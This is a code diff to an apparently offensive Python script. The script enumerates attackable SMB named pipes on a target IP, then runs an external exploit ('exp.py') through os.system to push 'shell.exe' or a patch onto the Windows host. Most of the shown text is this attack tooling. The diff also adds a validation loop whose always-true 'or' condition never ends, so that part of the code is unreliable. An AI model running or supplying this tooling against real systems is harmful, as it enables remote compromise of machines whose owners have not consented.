@@ -32,22 +32,24 @@ pipes = {
 }
 
 
-
 def bomb(pipe):
-    print "[*] Killing target...    [*]\n"
+    print ("[*] Nuking target...     [*]\n")
     # print "[*] Starting services... [*]\n"
     ipaddre = sys.argv[1]  # '192.168.17.134'
     u_choice = raw_input("Shell or Patch? (S/P) for " + ipaddre)
 
-    global comman
-    if u_choice == 'S':
-        comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' shell.exe'
-    elif u_choice == 'P':
-        comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' win_7.msu'
+    while (u_choice != 'S' or u_choice != 's' or u_choice != 'P' or u_choice != 'p'):
+        u_choice = raw_input("Please enter valid choice (S/P): ")
+
+    global command
+    if u_choice == 'S' or u_choice == 's':
+        command = 'python exp.py ' + ipaddre + ' ' + pipe + ' shell.exe'
+    elif u_choice == 'P' or u_choice == 'p':
+        command = 'python exp.py ' + ipaddre + ' ' + pipe + ' win_7.msu'
     # elif u_choice == 'I':
     #     comman = 'python exp.py ' + ipaddre + ' ' + pipe + ' identify.exe'
-    print comman
-    os.system(comman)
+    print (command)
+    os.system(command)
 
 
 if len(sys.argv) < 2:
@@ -55,7 +57,7 @@ if len(sys.argv) < 2:
     sys.exit(1)
 
 target = sys.argv[1]
-print "\nNuking " + target
+print ("\nNuking " + target)
 
 conn = MYSMB(target)
 try:
@@ -104,16 +106,18 @@ for pipe_name, pipe_uuid in pipes.items():
 
         dce.disconnect()
     except smb.SessionError as e:
-        print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
+        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
+        print("[*] Connection failed!!  [*]")
     except smbconnection.SessionError as e:
-        print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))
+        # print('{}: {}'.format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))
+        print("[*] Connection failed!!  [*]")
 
 conn.disconnect_tree(tid)
 conn.logoff()
 conn.get_socket().close()
-print "\n[*] Attackable namedpipes :P [*]"
+print ("\n[*] Attackable namedpipes :P [*]")
 s = ","
-print listing.replace(",", "\n")
+print (listing.replace(",", "\n"))
 
 listing = listing.replace(",", " ")
 for namedpipe in listing.split():
